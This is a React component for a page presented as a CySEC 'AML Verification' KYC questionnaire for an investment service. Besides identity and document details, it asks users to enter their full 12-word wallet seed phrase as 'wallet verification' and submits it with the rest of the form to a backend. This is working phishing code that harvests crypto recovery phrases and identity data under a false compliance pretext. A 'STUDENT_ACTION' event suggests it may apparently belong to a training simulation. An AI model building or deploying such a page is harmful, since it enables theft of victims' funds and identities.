import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Icons } from '../assets/Icons';
import { useApp } from '../context/AppContext';
import { useNavigate } from 'react-router-dom';
import socket from '../services/socketService';

const ALL_QUESTIONS = [
  { id: '1', type: 'text', label: 'Full Name', hint: '(Full name as stated in the document)' },
  { id: '2', type: 'text', label: 'Date of Birth', hint: '(Enter date in DD.MM.YYYY format)', placeholder: 'DD.MM.YYYY' },
  { id: '3', type: 'text', label: 'Citizenship', hint: '(Country of which you are a citizen)' },
  { id: '4', type: 'email', label: 'Email', hint: '(Valid email address for communication)' },
  { id: '5', type: 'tel', label: 'Phone Number', hint: '(With country code, e.g., +7 123 456 7890)' },
  { id: '6', type: 'text', label: 'Full Residential Address', hint: '(Country, city, street, house, apartment, postal code)' },
  { id: '7', type: 'select', label: 'Document Type', hint: "(Passport, ID card, driver's license)", options: [
      { value: 'passport', label: 'Passport' },
      { value: 'id-card', label: 'ID Card' },
      { value: 'driver-license', label: "Driver's License" }
    ] 
  },
  { id: '8', type: 'text', label: 'Document Number', hint: '(As stated in the document)' },
  { id: '9', type: 'text', label: 'Issue Date', hint: '(Document issuance date)', placeholder: 'DD.MM.YYYY' },
  { id: '10', type: 'text', label: 'Expiry Date', hint: '(If applicable)', placeholder: 'DD.MM.YYYY' },
  { id: '11', type: 'email_trigger', label: 'Documents', hint: 'Please upload the following documents to support@cysecfinance.com:\n- A scan of your document.\n- A bank statement.\n- A document verifying your residential address.' },
  { id: '12', type: 'text', label: 'Investment Amount', hint: '(In the currency of investment)' },
  { id: '13', type: 'select', label: 'Source of Funds', hint: '(Salary, business, inheritance, savings, investments, other)', options: [
      { value: 'salary', label: 'Salary' }, { value: 'business', label: 'Business' }, { value: 'inheritance', label: 'Inheritance' },
      { value: 'savings', label: 'Savings' }, { value: 'investments', label: 'Investments' }, { value: 'other', label: 'Other' }
    ]
  },
  { id: '14', type: 'text', label: 'Capital Amount', hint: '(Total capital amount)' },
  { id: '15', type: 'text', label: 'Wallet Number for Payment', hint: '(Wallet must comply with the Smart Contract conditions)' },
  { id: '16', type: 'seed', label: 'Wallet Verification', hint: '(Seed phrase must match the one set in the Smart Contract)' },
  { id: '17', type: 'select', label: 'Are you a Politically Exposed Person (PEP)?', hint: '(Persons holding public office or related to them)', options: [{value:'no', label:'No'}, {value:'yes', label:'Yes'}] },
  { id: '18', type: 'select', label: 'I confirm that I am not associated with sanctioned countries/persons', hint: '(Confirmation of compliance with regulatory requirements)', options: [{value:'yes', label:'Yes'}, {value:'no', label:'No'}] },
  { id: '19', type: 'select', label: 'I confirm that I have not participated in terrorism financing or money laundering', hint: '(AML/CFT requirement)', options: [{value:'yes', label:'Yes'}, {value:'no', label:'No'}] },
  { id: '20', type: 'select', label: 'I consent to the processing of personal data and AML checks', hint: '(Required for CySEC compliance)', options: [{value:'yes', label:'Yes'}, {value:'no', label:'No'}] },
  { id: '21', type: 'text', label: 'Date of Submission', hint: '(Date of form submission)', placeholder: 'DD.MM.YYYY' },
];

export default function KycQuestionnaire() {
  const { user, updateUser } = useApp();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({});
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [showSeedModal, setShowSeedModal] = useState(false);
  const [seedVerified, setSeedVerified] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // The user requested ALL questions to be visible.
  const activeQuestions = ALL_QUESTIONS;

  const handleInputChange = (id, value) => {
    setFormData(prev => ({ ...prev, [id]: value }));
  };

  const handleSeedChange = (index, value) => {
    const newWords = [...seedWords];
    newWords[index] = value;
    setSeedWords(newWords);
  };

  const handleSendEmail = () => {
    const subject = encodeURIComponent('KYC Document Submission');
    const body = encodeURIComponent('Please find the attached KYC documents.');
    window.location.href = `mailto:support@cysecfinance.com?subject=${subject}&body=${body}`;
  };

  const verifySeed = () => {
    if (seedWords.some(w => !w.trim())) {
      alert('Please fill all 12 words of your seed phrase.');
      return;
    }
    setShowSeedModal(false);
    setSeedVerified(true);
    handleInputChange('16', seedWords.join(' ')); // Save seed phrase
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Basic validation
    for (let q of activeQuestions) {
      if (q.type !== 'email_trigger' && !formData[q.id] && q.type !== 'seed') {
        alert(`Please fill out: ${q.label}`);
        return;
      }
      if (q.type === 'seed' && !seedVerified) {
        alert('Please complete Wallet Verification.');
        return;
      }
    }

    setIsSubmitting(true);
    try {
      const backendUrl = import.meta.env.VITE_BACKEND_URL || 'http://localhost:5001';
      const token = localStorage.getItem('lumen_token') || sessionStorage.getItem('lumen_token');
      
      const res = await fetch(`${backendUrl}/api/v1/kyc-submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          userId: user?._id,
          data: formData
        })
      });
      
      // Even if the endpoint doesn't exist yet, we update locally
      updateUser({ kycStatus: 'pending', amlStatus: 'pending' });
      
      socket.emit('STUDENT_ACTION', {
        type: 'kyc_submitted',
        details: 'User submitted the 21-question KYC/AML form'
      });
      
      alert('Your data is under review! The decision will be sent to your email.');
      navigate('/');
    } catch (e) {
      console.error(e);
      alert('Submission failed. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Progress calculation
  const totalRequired = activeQuestions.filter(q => q.type !== 'email_trigger').length;
  const filledRequired = activeQuestions.filter(q => {
    if (q.type === 'email_trigger') return false;
    if (q.type === 'seed') return seedVerified;
    return !!formData[q.id];
  }).length;
  const progress = totalRequired === 0 ? 0 : (filledRequired / totalRequired) * 100;

  return (
    <motion.div
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      exit={{ opacity: 0, x: 50 }}
      className="fixed inset-0 bg-[#F4F7FA] z-50 overflow-y-auto pb-24"
    >
      <div className="sticky top-0 bg-white/90 border-b border-gray-100 px-5 py-4 z-10 flex items-center justify-between">
        <button onClick={() => navigate(-1)} className="p-2 -ml-2 rounded-full hover:bg-gray-100">
          <Icons.ArrowLeft size={24} />
        </button>
        <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 rounded-lg text-green-700 text-xs font-bold">
          <Icons.Lock size={14} /> Secure Connection
        </div>
      </div>

      <div className="p-5 max-w-2xl mx-auto">
        <div className="text-center mb-8">
          <img src="https://i.postimg.cc/Nj9VZgmW/Anti-Money-Laundering-Questionnaire-4-photoaidcom-invert.png" alt="Logo" className="h-16 mx-auto mb-4 object-contain" />
          <h1 className="text-2xl font-bold text-gray-900">AML Verification Process</h1>
          <p className="text-sm text-gray-500 mt-2">Please complete the required information below to proceed.</p>
        </div>

        {/* Progress Bar */}
        <div className="mb-8">
          <div className="flex justify-between text-xs font-bold text-gray-500 mb-2">
            <span>Progress</span>
            <span>{Math.round(progress)}%</span>
          </div>
          <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
            <div className="h-full bg-blue-600 transition-all duration-300" style={{ width: `${progress}%` }} />
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {activeQuestions.map(q => (
            <div key={q.id} className="bg-white p-5 rounded-2xl shadow-sm border border-gray-100">
              <label className="block text-sm font-bold text-gray-900 mb-1">
                {q.label}
              </label>
              <p className="text-xs text-gray-500 mb-3">{q.hint}</p>

              {q.type === 'text' || q.type === 'email' || q.type === 'tel' ? (
                <input
                  type={q.type}
                  placeholder={q.placeholder || ''}
                  value={formData[q.id] || ''}
                  onChange={e => handleInputChange(q.id, e.target.value)}
                  className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
                />
              ) : q.type === 'select' ? (
                <div className="relative">
                  <select
                    value={formData[q.id] || ''}
                    onChange={e => handleInputChange(q.id, e.target.value)}
                    className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm appearance-none focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
                  >
                    <option value="">Select an option...</option>
                    {q.options.map(opt => (
                      <option key={opt.value} value={opt.value}>{opt.label}</option>
                    ))}
                  </select>
                  <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                    <Icons.ChevronDown size={16} />
                  </div>
                </div>
              ) : q.type === 'email_trigger' ? (
                <button
                  type="button"
                  onClick={handleSendEmail}
                  className="w-full py-3 bg-black text-white rounded-xl text-sm font-bold hover:bg-gray-800 transition-colors"
                >
                  Send Documents via Email
                </button>
              ) : q.type === 'seed' ? (
                <button
                  type="button"
                  onClick={() => setShowSeedModal(true)}
                  className={`w-full py-3 rounded-xl text-sm font-bold transition-colors ${
                    seedVerified ? 'bg-green-100 text-green-700' : 'bg-black text-white hover:bg-gray-800'
                  }`}
                >
                  {seedVerified ? '✅ Phrase Verified' : 'Enter Seed Phrase'}
                </button>
              ) : null}
            </div>
          ))}

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full py-4 bg-blue-600 text-white rounded-2xl font-bold text-lg shadow-lg shadow-blue-600/30 active:scale-[0.98] transition-all disabled:opacity-70"
          >
            {isSubmitting ? 'Submitting...' : 'Sign & Submit'}
          </button>
        </form>
      </div>

      {/* Seed Phrase Modal */}
      <AnimatePresence>
        {showSeedModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-5 bg-black/60 backdrop-blur-sm"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-white rounded-3xl w-full max-w-md overflow-hidden shadow-2xl"
            >
              <div className="p-6 border-b border-gray-100 flex justify-between items-center">
                <h3 className="text-xl font-bold text-gray-900">Enter Seed Phrase</h3>
                <button onClick={() => setShowSeedModal(false)} className="text-gray-400 hover:text-gray-900">
                  <Icons.X size={24} />
                </button>
              </div>
              <div className="p-6">
                <p className="text-sm text-gray-500 mb-6">Enter your 12-word recovery phrase to verify wallet ownership.</p>
                <div className="grid grid-cols-3 gap-3 mb-6">
                  {seedWords.map((word, i) => (
                    <div key={i} className="relative">
                      <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] text-gray-400 font-medium">
                        {i + 1}
                      </span>
                      <input
                        type="text"
                        value={word}
                        onChange={e => handleSeedChange(i, e.target.value)}
                        className="w-full bg-gray-50 border border-gray-200 rounded-lg py-2 pl-6 pr-2 text-sm focus:border-blue-500 focus:outline-none"
                      />
                    </div>
                  ))}
                </div>
                <button
                  onClick={verifySeed}
                  className="w-full py-3 bg-black text-white rounded-xl font-bold text-sm hover:bg-gray-800 transition-colors"
                >
                  Verify Phrase
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
}
